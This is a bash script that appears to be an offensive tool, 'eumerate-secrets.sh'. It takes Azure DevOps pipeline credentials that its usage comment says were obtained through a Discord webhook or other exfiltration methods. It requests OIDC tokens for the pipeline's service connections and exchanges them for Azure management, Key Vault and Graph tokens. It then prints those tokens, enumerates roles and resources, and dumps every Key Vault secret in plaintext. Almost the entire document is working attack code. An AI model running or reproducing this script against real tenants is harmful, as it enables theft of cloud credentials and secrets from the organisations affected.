# Usage:
# SP_CLIENT_ID="" TENANT_ID="" SYSTEM_ACCESSTOKEN="" SUBSCRIPTION_ID="" ORG_URL="" bash eumerate-secrets.sh
# values retrieved from Discord webhook ^ or other exfil methods

#!/bin/bash
set -euo pipefail

# from azureProfile.json
TENANT="${TENANT_ID:?}"
# from azureProfile.json
ORG="${ORG_URL:?}"
# from azureProfile.json
CLIENT="${SP_CLIENT_ID:?}"
# from azureProfile.json
SUB="${SUBSCRIPTION_ID:?}"

# from NpmAuthenticate/DevOps Task
TOKEN="${SYSTEM_ACCESSTOKEN:?}"

# from msal_cache.json - to be implemented
# ID_TOKEN="${ACCESSTOKEN:?}"

_curl() {
  local url
  for a in "$@"; do [[ $a == https://* ]] && url=$a; done
  echo "[>] $url" >&2
  curl -S "$@"
}

echo "[+] org: $ORG"

# decode JWT payload — project, plan, job are all in the token
_b64=$(echo "$TOKEN" | cut -d'.' -f2 | tr -- '-_' '+/')
case $((${#_b64} % 4)) in 2) _b64+="==" ;; 3) _b64+="=" ;; esac
_jwt=$(printf '%s' "$_b64" | base64 -d 2>/dev/null)

# project: BuildId = "{projectGuid};{buildNumber}"
PROJECT="${PROJECT_ID:-$(jq -r '.BuildId | split(";")[0]' <<< "$_jwt")}"
echo "[+] project: $PROJECT"

# plan + job: jobref = "{planId}:{jobId}"
_jobref=$(jq -r '.jobref' <<< "$_jwt")
PLAN="${PLAN_ID:-$(echo "$_jobref" | cut -d':' -f1)}"
JOB="${JOB_ID:-$(echo "$_jobref" | cut -d':' -f2)}"
echo "[+] plan: $PLAN"
echo "[+] job: $JOB"

# SC: still needs the ACL side-channel
_sc_ns=$(_curl -sf -H "Authorization: Bearer $TOKEN" \
  "$ORG/_apis/securitynamespaces?api-version=7.1" \
  | jq -r '.value[] | select(.name == "ServiceEndpoints") | .namespaceId')
[[ -z "$_sc_ns" ]] && echo "[-] could not find ServiceEndpoints namespace" && exit 1
echo "[+] namespace: $_sc_ns"

if [[ -n "${SERVICE_CONNECTION_ID:-}" ]]; then
  _sc_ids=("$SERVICE_CONNECTION_ID")
else
  mapfile -t _sc_ids < <(_curl -sf -H "Authorization: Bearer $TOKEN" \
    "$ORG/_apis/accesscontrollists/$_sc_ns?api-version=7.1" \
    | jq -r --arg pid "$PROJECT" \
      '.value[].token | select(test("^endpoints/" + $pid + "/[a-f0-9-]{36}$")) | split("/")[-1]')
fi
[[ ${#_sc_ids[@]} -eq 0 ]] && echo "[-] no service connections found in ACL" && exit 1
echo "[+] found ${#_sc_ids[@]} service connection(s): ${_sc_ids[*]}"

get_token() {
  local scope="$1"
  _curl -sf -X POST "https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token" \
    -d "grant_type=client_credentials" \
    -d "client_id=$CLIENT" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    --data-urlencode "client_assertion=$oidc" \
    -d "scope=$scope" \
    | jq -r '.access_token // empty'
}

for SC in "${_sc_ids[@]}"; do
  echo ""
  echo "=== SC: $SC ==="

  oidc=$(_curl -sf -X POST \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{}' \
    "$ORG/$PROJECT/_apis/distributedtask/hubs/build/plans/$PLAN/jobs/$JOB/oidctoken?serviceConnectionId=$SC&api-version=7.1-preview.1" \
    | jq -r '.oidcToken // empty') || true
  [[ -z "$oidc" || "$oidc" == "null" ]] && echo "[-] oidc failed, skipping" && continue
  echo "[+] got oidc token"
  echo "[token:oidc]  $oidc"

  echo "exchanging for arm / kv / graph tokens"
  arm=$(get_token "https://management.azure.com/.default") || true
  kv=$(get_token  "https://vault.azure.net/.default")      || true
  graph=$(get_token "https://graph.microsoft.com/.default") || true

  [[ -z "$arm"   ]] && echo "[-] arm exchange failed"   || { echo "[+] arm token ok";   echo "[token:arm]   $arm";   }
  [[ -z "$kv"    ]] && echo "[-] kv exchange failed"    || { echo "[+] kv token ok";    echo "[token:kv]    $kv";    }
  [[ -z "$graph" ]] && echo "[-] graph exchange failed" || { echo "[+] graph token ok"; echo "[token:graph] $graph"; }

  # ARM
  if [[ -n "$arm" ]]; then
    echo ""
    echo "ARM: role assignments on subscription"
    _curl -sf -H "Authorization: Bearer $arm" -G \
      --data-urlencode "api-version=2022-04-01" \
      --data-urlencode "\$filter=principalId eq '$CLIENT'" \
      "https://management.azure.com/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments" \
      | jq -r '.value[] | "    role: \(.properties.roleDefinitionId | split("/") | last) on \(.properties.scope)"' 2>/dev/null || echo "    no results or no access"

    echo "ARM: key vaults in subscription"
    _curl -sf -H "Authorization: Bearer $arm" -G \
      --data-urlencode "api-version=2021-04-01" \
      --data-urlencode "\$filter=resourceType eq 'Microsoft.KeyVault/vaults'" \
      "https://management.azure.com/subscriptions/$SUB/resources" \
      | jq -r '.value[] | "    \(.name) (\(.location)) rg=\(.id | split("/")[4])"' 2>/dev/null || true

    echo "ARM: storage accounts"
    _curl -sf -H "Authorization: Bearer $arm" -G \
      --data-urlencode "api-version=2021-04-01" \
      --data-urlencode "\$filter=resourceType eq 'Microsoft.Storage/storageAccounts'" \
      "https://management.azure.com/subscriptions/$SUB/resources" \
      | jq -r '.value[] | "    \(.name) (\(.location))"' 2>/dev/null || true
  fi

  # key vault
  if [[ -n "$kv" && -n "$arm" ]]; then
    echo ""
    echo "KV: enumerating vaults"
    _curl -sf -H "Authorization: Bearer $arm" -G \
      --data-urlencode "api-version=2021-04-01" \
      --data-urlencode "\$filter=resourceType eq 'Microsoft.KeyVault/vaults'" \
      "https://management.azure.com/subscriptions/$SUB/resources" \
      | jq -r '.value[].name' 2>/dev/null | while IFS= read -r vault; do
        echo "  [vault] $vault"
        _curl -sf -H "Authorization: Bearer $kv" \
          "https://$vault.vault.azure.net/secrets?api-version=7.4" \
          | jq -r '.value[].id' 2>/dev/null | while IFS= read -r sid; do
            name=$(basename "$sid")
            val=$(_curl -sf -H "Authorization: Bearer $kv" "$sid?api-version=7.4" \
              | jq -r '.value // "[unreadable]"')
            echo "    $name = $val"
          done
      done
  fi

  # graph
  if [[ -n "$graph" ]]; then
    echo ""
    echo "graph: SP details"
    sp_oid=$(_curl -sf -H "Authorization: Bearer $graph" -G \
      --data-urlencode "\$filter=appId eq '$CLIENT'" \
      --data-urlencode "\$select=id,displayName" \
      "https://graph.microsoft.com/v1.0/servicePrincipals" \
      | jq -r '.value[0] | "\(.id) \(.displayName)"')
    echo "    $sp_oid"

    sp_id=$(echo "$sp_oid" | cut -d' ' -f1)
    if [[ -n "$sp_id" ]]; then
      echo "graph: app role assignments"
      _curl -sf -H "Authorization: Bearer $graph" \
        "https://graph.microsoft.com/v1.0/servicePrincipals/$sp_id/appRoleAssignments" \
        | jq -r '.value[] | "    \(.principalDisplayName) -> \(.resourceDisplayName) (\(.appRoleId))"' 2>/dev/null || echo "    none found"
    fi
  fi
done
